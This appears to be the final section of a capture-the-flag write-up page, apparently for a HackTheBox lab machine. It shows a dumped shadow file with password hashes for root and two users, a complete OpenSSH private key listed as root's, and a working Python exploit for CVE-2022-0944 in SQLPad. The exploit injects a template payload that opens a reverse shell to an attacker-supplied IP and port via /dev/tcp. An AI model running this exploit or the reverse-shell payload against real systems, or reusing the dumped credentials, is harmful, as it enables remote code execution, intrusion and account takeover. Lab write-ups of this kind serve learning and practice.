+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>root:$y$j9T$PScOTu/SFg7oaa/bfW4pL0$7oWEYAy0P18E3uDpsZUyoy78cubBKODqotqtAp4GtK0:19860:0:99999:7:::</span></span>
+<span class="line"><span>daemon:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>bin:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>sys:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>sync:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>games:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>man:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>lp:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>mail:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>news:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>uucp:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>proxy:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>www-data:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>backup:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>list:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>irc:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>gnats:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>nobody:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>_apt:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>systemd-network:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>systemd-resolve:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>messagebus:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>systemd-timesync:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>pollinate:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>sshd:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>syslog:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>uuidd:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>tcpdump:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>tss:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>landscape:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>fwupd-refresh:*:19405:0:99999:7:::</span></span>
+<span class="line"><span>usbmux:*:19858:0:99999:7:::</span></span>
+<span class="line"><span>michael:$y$j9T$VdjDEROmqIwhwxW5Mqie//$yo5dlS5BvDOm5r4snRGg6JQp2lK2Vip3mC5.A.e94S3:19860:0:99999:7:::</span></span>
+<span class="line"><span>lxd:!:19858::::::</span></span>
+<span class="line"><span>dnsmasq:*:19858:0:99999:7:::</span></span>
+<span class="line"><span>mysql:!:19858:0:99999:7:::</span></span>
+<span class="line"><span>proftpd:!:19858:0:99999:7:::</span></span>
+<span class="line"><span>ftp:*:19858:0:99999:7:::</span></span>
+<span class="line"><span>john:$y$j9T$0LxNq2qUgY68Htn6MURro/$X0njIWFZLfEQ.vKrDiPz5.GO3eJ7vHY1YSvmCc.5KvC:19858:0:99999:7:::</span></span>
+<span class="line"><span>_laurel:!:19944::::::</span></span></code></pre>
+<h3 id="ssh_key">SSH_KEY</h3>
+<ul>
+<li>/root/.ssh/id_rsa</li>
+</ul>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>-----BEGIN OPENSSH PRIVATE KEY-----</span></span>
+<span class="line"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn</span></span>
+<span class="line"><span>NhAAAAAwEAAQAAAgEAvTD30GGuaP9aLJaeV9Na4xQ3UBzYis5OhC6FzdQN0jxEUdl6V31q</span></span>
+<span class="line"><span>lXlLFVw4Z54A5VeyQ928EeForZMq1FQeFza+doOuGWIId9QjyMTYn7p+1yVilp56jOm4DK</span></span>
+<span class="line"><span>4ZKZbpayoA+jy5bHuHINgh7AkxSeNQIRvKznZAt4b7+ToukN5mIj6w/FQ7hgjQarpuYrox</span></span>
+<span class="line"><span>Y8ykJIBow5RKpUXiC07rHrPaXJLA61gxgZr8mheeahfvrUlodGhrUmvfrWBdBoDBI73hvq</span></span>
+<span class="line"><span>Vcb989J8hXKk6wLaLnEaPjL2ZWlk5yPrSBziW6zta3cgtXY/C5NiR5fljitAPGtRUwxNSk</span></span>
+<span class="line"><span>fP8rXekiD+ph5y4mstcd26+lz4EJgJQkvdZSfnwIvKtdKvEoLlw9HOUiKmogqHdbdWt5Pp</span></span>
+<span class="line"><span>nFPXkoNWdxoYUmrqHUasD0FaFrdGnZYVs1fdnnf4CHIyGC5A7GLmjPcTcFY1TeZ/BY1eoZ</span></span>
+<span class="line"><span>Ln7/XK4WBrkO4QqMoY0og2ZLqg7mWBvb2yXLv/d1vbFb2uCraZqmSo4kcR9z9Jv3VlR3Fy</span></span>
+<span class="line"><span>9HtIASjMbTj5bEDIjnm54mmglLI5+09V0zcZm9GEckhoIJnSdCJSnCLxFyOHjRzIv+DVAN</span></span>
+<span class="line"><span>ajxu5nlaGbiEyH4k0FGjjzJKxn+Gb+N5b2M1O3lS56SM5E18+4vT+k6hibNJIsApk4yYuO</span></span>
+<span class="line"><span>UAAAdIx7xPAMe8TwAAAAAHc3NoLXJzYQAAAgEAvTD30GGuaP9aLJaeV9Na4xQ3UBzYis5O</span></span>
+<span class="line"><span>hC6FzdQN0jxEUdl6V31qlXlLFVw4Z54A5VeyQ928EeForZMq1FQeFza+doOuGWIId9QjyM</span></span>
+<span class="line"><span>TYn7p+1yVilp56jOm4DK4ZKZbpayoA+jy5bHuHINgh7AkxSeNQIRvKznZAt4b7+ToukN5m</span></span>
+<span class="line"><span>Ij6w/FQ7hgjQarpuYroxY8ykJIBow5RKpUXiC07rHrPaXJLA61gxgZr8mheeahfvrUlodG</span></span>
+<span class="line"><span>hrUmvfrWBdBoDBI73hvqVcb989J8hXKk6wLaLnEaPjL2ZWlk5yPrSBziW6zta3cgtXY/C5</span></span>
+<span class="line"><span>NiR5fljitAPGtRUwxNSkfP8rXekiD+ph5y4mstcd26+lz4EJgJQkvdZSfnwIvKtdKvEoLl</span></span>
+<span class="line"><span>w9HOUiKmogqHdbdWt5PpnFPXkoNWdxoYUmrqHUasD0FaFrdGnZYVs1fdnnf4CHIyGC5A7G</span></span>
+<span class="line"><span>LmjPcTcFY1TeZ/BY1eoZLn7/XK4WBrkO4QqMoY0og2ZLqg7mWBvb2yXLv/d1vbFb2uCraZ</span></span>
+<span class="line"><span>qmSo4kcR9z9Jv3VlR3Fy9HtIASjMbTj5bEDIjnm54mmglLI5+09V0zcZm9GEckhoIJnSdC</span></span>
+<span class="line"><span>JSnCLxFyOHjRzIv+DVANajxu5nlaGbiEyH4k0FGjjzJKxn+Gb+N5b2M1O3lS56SM5E18+4</span></span>
+<span class="line"><span>vT+k6hibNJIsApk4yYuOUAAAADAQABAAACAEM80X3mEWGwiuA44WqOK4lzqFrY/Z6LRr1U</span></span>
+<span class="line"><span>eWpW2Fik4ZUDSScp5ATeeDBNt6Aft+rKOYlEFzB1n0m8+WY/xPf0FUmyb+AGhsLripIyX1</span></span>
+<span class="line"><span>iZI7Yby8eC6EQHVklvYHL29tsGsRU+Gpoy5qnmFlw4QiOj3Vj+8xtgTIzNNOT06BLFb5/x</span></span>
+<span class="line"><span>Dt6Goyb2H/gmbM+6o43370gnuNP1cnf9d6IUOJyPR+ZJo7WggOuyZN7w0PScsCoyYiSo7a</span></span>
+<span class="line"><span>d7viF0k2sZvEqTE9U5GLqLqMToPw5Cq/t0H1IWIEo6wUAm/hRJ+64Dm7oh9k1aOYNDzNcw</span></span>
+<span class="line"><span>rFsahOt8QhUeRFhXyGPCHiwAjIFlaa+Ms+J9CQlSuyfm5xlKGUh+V9c9S6/J5NLExxldIO</span></span>
+<span class="line"><span>e/eIS7AcuVmkJQP7TcmXYyfM5OTrHKdgxX3q+Azfu67YM6W+vxC71ozUGdVpLBouY+AoK9</span></span>
+<span class="line"><span>Htx7Ev1oLVhIRMcCxQJ4YprJZLor/09Rqav+Q2ieMNOLDb+DSs+eceUsKEq0egIodE50YS</span></span>
+<span class="line"><span>kH/AKFNgnW1XBmnV0Hu+vreYD8saiSBvDgDDiOmqJjbgsUvararT80p/A5A211by/+hCuO</span></span>
+<span class="line"><span>gWvSnYYwWx18CZIPuxt3eZq5HtWnnv250I6yLCPZZF+7c3uN2iibTCUwo8YFsf1BDzpqTW</span></span>
+<span class="line"><span>3oZ3C5c5BmKBW/Cds7AAABAHxeoC+Sya3tUQBEkUI1MDDZUbpIjBmw8OIIMxR96qqNyAdm</span></span>
+<span class="line"><span>ZdJC7pXwV52wV+zky8PR79L4lpoSRwguC8rbMnlPWO2zAWW5vpQZjsCj1iiU8XrOSuJoYI</span></span>
+<span class="line"><span>Z2XeUGAJe7JDb40G9EB14UAk6XjeU5tWb0zkKypA+ixfyW59kRlca9mRHEeGXKT+08Ivm9</span></span>
+<span class="line"><span>SfYtlYzbYDD/EcW2ajFKdX/wjhq049qPQNpOTE0bNkTLFnujQ78RyPZ5oljdkfxiw6NRi7</span></span>
+<span class="line"><span>qyhOZp09LBmNN241/dHFxm35JvVkLqr2cG+UTu0NtNKzMcXRxgJ76IvwuMqp+HxtJPzC/n</span></span>
+<span class="line"><span>yyujI/x1rg9B60AAAAEBAMhgLJFSewq2bsxFqMWL11rl6taDKj5pqEH36SStBZPwtASKvO</span></span>
+<span class="line"><span>OrCYzkNPqQYLtpqN4wiEX0RlcqawjjBxTtYKpEbosydNYk4DFo9DXpzK1YiJ/2RyvlE7XT</span></span>
+<span class="line"><span>UHRRgU7G8n8Q53zOjkXiQgMU8ayCmlFg0aCBYu+3yqp5deTiDVUVVn1GJf4b6jWuJkbyvy</span></span>
+<span class="line"><span>uVmkDYBHxpjscG0Z11ngNu89YhWmDZfu38sfEcV828cHUW2JJJ/WibCCzGRhG4K1gLTghL</span></span>
+<span class="line"><span>L+/cNo97CK/6XHaEhEOHE5ZWvNR6SaiGzhUQzmz9PIGRlLX7oSvNyanH2QORwocFF0z1Aj</span></span>
+<span class="line"><span>+6dwxnESdflQcAAAEBAPG196zSYV4oO75vQzy8UFpF4SeKBggjrQRoY0ExIIDrSbJjKavS</span></span>
+<span class="line"><span>0xeH/JTql1ApcPCOL4dEf3nkVqgui5/2rQqz901p3s8HGoAiD2SS1xNBQi6FrtMTRIRcgr</span></span>
+<span class="line"><span>46UchOtoTP0wPIliHohFKDIkXoglLtr8QBNBS7SEI+zTzlPVYZNw8w0fqcCh3xfjjy/DNm</span></span>
+<span class="line"><span>9KlxLdjvS21nQS9N82ejLZNHzknUb1fohTvnnKpEoFCWOhmIsWB9NhFf7GQV1lUXdcRy1f</span></span>
+<span class="line"><span>ojHlAvysf4a4xuX72CXMyRfVGXTtK3L18SZksdrg0CAKgxnMGWNkgD6I/M+EwSJQmgsLPK</span></span>
+<span class="line"><span>tLfOAdSsE7MAAAASam9obkBzaWdodGxlc3MuaHRiAQ==</span></span>
+<span class="line"><span>-----END OPENSSH PRIVATE KEY-----</span></span></code></pre>
+<h3 id="exp-cve-2022-0944">EXP CVE-2022-0944</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic">#!/usr/bin/env python3</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-light-font-style:inherit;--shiki-dark:#54B9FF;--shiki-dark-font-style:italic">import</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> argparse</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-light-font-style:inherit;--shiki-dark:#54B9FF;--shiki-dark-font-style:italic">import</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> requests</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> main</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">():</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">   </span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">    parser </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> argparse.</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">ArgumentParser</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#E36209;--shiki-light-font-style:inherit;--shiki-dark:#4BF3C8;--shiki-dark-font-style:italic">description</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"CVE-2022-0944 RCE Exploit"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">    parser.</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">add_argument</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'root_url'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">, </span><span style="--shiki-light:#E36209;--shiki-light-font-style:inherit;--shiki-dark:#4BF3C8;--shiki-dark-font-style:italic">help</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"Root URL of the SQLPad application"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">    parser.</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">add_argument</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'attacker_ip'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">, </span><span style="--shiki-light:#E36209;--shiki-light-font-style:inherit;--shiki-dark:#4BF3C8;--shiki-dark-font-style:italic">help</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"attacker ip"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">    parser.</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">add_argument</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'attacker_port'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">, </span><span style="--shiki-light:#E36209;--shiki-light-font-style:inherit;--shiki-dark:#4BF3C8;--shiki-dark-font-style:italic">help</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"attacker port"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">    </span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">    args </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> parser.</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">parse_args</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">()</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">    target_url </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> f</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">{</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">args.root_url</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">}</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">/api/test-connection"</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">    payload </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> f</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">{{{{</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> process.mainModule.require('child_process').exec('/bin/bash -c </span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\"</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">bash -i &gt;&amp; /dev/tcp/</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">{</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">args.attacker_ip</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">}</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">{</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">args.attacker_port</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">}</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> 0&gt;&amp;1</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\"</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">') </span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">}}}}</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">    headers </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> {</span></span>
+<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">        'Content-Type'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">: </span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'application/json'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">,</span></span>
+<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">        'Accept'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">: </span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'application/json'</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic">    #POST data (JSON body of the request)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">    data </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> {</span></span>
+<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">        "name"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">: </span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"test"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">,</span></span>
+<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">        "driver"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">: </span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"mysql"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">,</span></span>
+<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">        "data"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">: {</span></span>
+<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">            "database"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">: payload</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">        },</span></span>
+<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">        "database"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">: payload</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-light-font-style:inherit;--shiki-dark:#54B9FF;--shiki-dark-font-style:italic">    try</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">:</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">        response </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> requests.</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">post</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(target_url, </span><span style="--shiki-light:#E36209;--shiki-light-font-style:inherit;--shiki-dark:#4BF3C8;--shiki-dark-font-style:italic">headers</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">headers, </span><span style="--shiki-light:#E36209;--shiki-light-font-style:inherit;--shiki-dark:#4BF3C8;--shiki-dark-font-style:italic">json</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">data)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">       </span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">        print</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">f</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"Response status code: </span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">{</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">response.status_code</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">}</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">        print</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">f</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"Response body: </span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">{</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">response.text</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">}</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-light-font-style:inherit;--shiki-dark:#54B9FF;--shiki-dark-font-style:italic">        if</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> response.status_code </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">==</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> 200</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">:</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">            print</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">f</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"Exploit sent successfully. Check your listener on </span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">{</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">args.attacker_ip</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">}</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">:</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">{</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">args.attacker_port</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">}</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-light-font-style:inherit;--shiki-dark:#54B9FF;--shiki-dark-font-style:italic">        else</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">:</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">            print</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">f</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"Exploit sent, but server responded with status code: </span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">{</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">response.status_code</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">}</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">. Check your listener."</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-light-font-style:inherit;--shiki-dark:#54B9FF;--shiki-dark-font-style:italic">    except</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> Exception</span><span style="--shiki-light:#D73A49;--shiki-light-font-style:inherit;--shiki-dark:#54B9FF;--shiki-dark-font-style:italic"> as</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> e:</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">        print</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">f</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"Error: </span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">{</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">e</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">}</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-light-font-style:inherit;--shiki-dark:#54B9FF;--shiki-dark-font-style:italic">if</span><span style="--shiki-light:#005CC5;--shiki-dark:#4BF3C8"> __name__</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> ==</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "__main__"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">:</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">    main</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">()</span></span></code></pre>
+</div></article></main><footer data-astro-cid-jo6i4kqk><div class="inner" data-astro-cid-jo6i4kqk><p class="line" data-astro-cid-jo6i4kqk>© 2026 Zumpyx</p><p class="note" data-astro-cid-jo6i4kqk>notes · exploit · write · repeat</p></div></footer></body></html>
